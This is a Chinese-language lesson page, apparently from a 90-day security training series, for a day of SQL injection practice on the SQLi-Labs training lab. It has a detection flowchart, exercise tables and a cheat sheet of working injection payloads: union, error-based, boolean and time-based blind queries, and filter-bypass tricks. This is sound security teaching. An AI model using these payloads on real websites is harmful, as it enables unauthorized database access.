---
title: Day036：SQL 注入进阶 - 综合练习
tags:
  - 网络安全
  - SQL注入
  - 综合练习
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d036
date: 2026-02-27
updated: 2026-01-28
---

# Day036：SQL 注入进阶 - 综合练习

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 6：SQL 注入进阶 |
| **今日主题** | SQL 注入综合实战 |
| **预计时间** | 3-4 小时 |
| **难度等级** | 进阶挑战 |

---

## 今日痛点场景

> **场景**：你这周学了布尔盲注、时间盲注、报错注入、WAF 绕过、二次注入、宽字节注入。但真实环境不会告诉你该用哪种！
>
> **问题**：面对一个未知的注入点，怎么判断该用什么技术？
>
> **今天的任务**：综合练习，建立完整的 SQL 注入思维体系。

---

## 今日目标

- [ ] 完成 SQLi-Labs 10 道综合题
- [ ] 能快速判断注入类型
- [ ] 能根据场景选择合适的注入方式
- [ ] 输出自己的 SQL 注入流程图

**闯关条件**：完成至少 8 道题目。

---

## SQL 注入判断流程

### 第一步：判断是否存在注入

```sql
# 数字型测试
?id=1 and 1=1
?id=1 and 1=2
?id=1-0
?id=2-1

# 字符型测试
?id=1'
?id=1"
?id=1' and '1'='1
?id=1' and '1'='2

# 观察：页面变化、报错信息、响应时间
```

### 第二步：判断注入类型

| 现象 | 注入类型 | 推荐方法 |
|------|----------|----------|
| 页面直接回显数据 | 有回显 | Union 注入 |
| 页面显示错误信息 | 报错 | 报错注入 |
| 页面内容有变化（真/假） | 布尔盲注 | 布尔盲注 |
| 页面完全无变化 | 时间盲注 | 时间盲注 |

### 第三步：选择注入方式

```
能 Union → Union 注入（最快）
↓ 不行
能报错 → 报错注入（较快）
↓ 不行
页面有变化 → 布尔盲注（较慢）
↓ 不行
时间盲注（最慢但最可靠）
```

---

## 综合练习任务

### 任务 1：SQLi-Labs 挑战（3 小时）

完成以下关卡并记录你的解题过程：

| 关卡 | 类型 | 你的 Payload | 完成状态 |
|------|------|--------------|----------|
| Less-5 | 报错注入 | | ⬜ |
| Less-6 | 报错注入（双引号） | | ⬜ |
| Less-8 | 布尔盲注 | | ⬜ |
| Less-9 | 时间盲注 | | ⬜ |
| Less-10 | 时间盲注（双引号） | | ⬜ |
| Less-23 | 过滤注释 | | ⬜ |
| Less-24 | 二次注入 | | ⬜ |
| Less-25 | 过滤 AND/OR | | ⬜ |
| Less-26 | 过滤空格和注释 | | ⬜ |
| Less-32 | 宽字节注入 | | ⬜ |

---

### 任务 2：绕过技巧总结表

根据今天的练习，完成以下总结：

| 被过滤的内容 | 绕过方法 | Payload 示例 |
|--------------|----------|--------------|
| 空格 | | |
| 单引号 | | |
| 双引号 | | |
| and/or | | |
| 注释符 | | |
| union | | |
| select | | |

---

### 任务 3：绘制 SQL 注入思维导图（30 分钟）

创建你自己的 SQL 注入流程图：

```
SQL 注入
├── 判断注入点
│   ├── 数字型
│   └── 字符型
│       ├── 单引号闭合
│       ├── 双引号闭合
│       └── 括号闭合
├── 选择注入方式
│   ├── Union 注入
│   ├── 报错注入
│   ├── 布尔盲注
│   └── 时间盲注
├── 绕过防护
│   ├── 大小写
│   ├── 编码
│   ├── 注释
│   └── 替换
└── 特殊类型
    ├── 二次注入
    └── 宽字节注入
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 完成 5 道基础题 | 30 分 |
| 完成 3 道绕过题 | 30 分 |
| 完成绕过技巧总结表 | 20 分 |
| 绘制思维导图 | 20 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 速查手册

### 各类型注入 Payload 速查

**Union 注入**：
```sql
?id=1' order by 3--+
?id=-1' union select 1,2,3--+
?id=-1' union select database(),user(),version()--+
```

**报错注入**：
```sql
?id=1' and extractvalue(1,concat(0x7e,database()))--+
?id=1' and updatexml(1,concat(0x7e,database()),1)--+
```

**布尔盲注**：
```sql
?id=1' and length(database())=4--+
?id=1' and ascii(substr(database(),1,1))>100--+
```

**时间盲注**：
```sql
?id=1' and if(length(database())=4,sleep(3),0)--+
?id=1' and if(ascii(substr(database(),1,1))>100,sleep(3),0)--+
```

### 常见绕过速查

```sql
# 空格绕过
/**/  %09  %0a  %0b  %0c  %a0  ()

# 大小写
UnIoN SeLeCt

# 双写
uniunionon  selselectect

# 编码
URL编码  双重编码  十六进制

# 注释符替代
-- (空格)  --+  #  /**/  ;%00
```

---

## 常见问题

**Q1：SQLi-Labs 怎么安装？**

A1：
```bash
# Docker 方式
docker pull acgpiano/sqli-labs
docker run -d -p 8080:80 acgpiano/sqli-labs
```

**Q2：题目太难做不出来怎么办？**

A2：
1. 先看源代码分析过滤逻辑
2. 参考网上的 WriteUp
3. 理解原理比完成题目更重要

**Q3：实际环境和靶场有什么区别？**

A3：
1. 实际环境有 WAF
2. 实际环境有流量限制
3. 实际环境错误信息被隐藏
4. 但原理都是相同的

---

## 明日预告

**Day 037：Week 6 周末闯关 - SQL 注入进阶总结**

明天你将：
- 回顾本周所有知识点
- 完成综合挑战
- 输出学习总结

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 完成的题目数量 | /10 |
| 最难的题目 | |
| 今日收获 | |

---

> **导师点评**：
>
> 今天是练习日。没有新知识，只有熟练度。
>
> SQL 注入的各种技巧，你现在都"知道"了。但"知道"和"会用"是两回事。
>
> SQLi-Labs 的题目，做 3 遍以上，你才能说"会"SQL 注入。
>
> 面试官问你 SQL 注入，你要能脱口而出：判断类型、选择方法、绕过防护。
>
> **记住：熟能生巧，巧能生精**。

```bash
echo "Day 036 Complete! 综合练习日！"
```
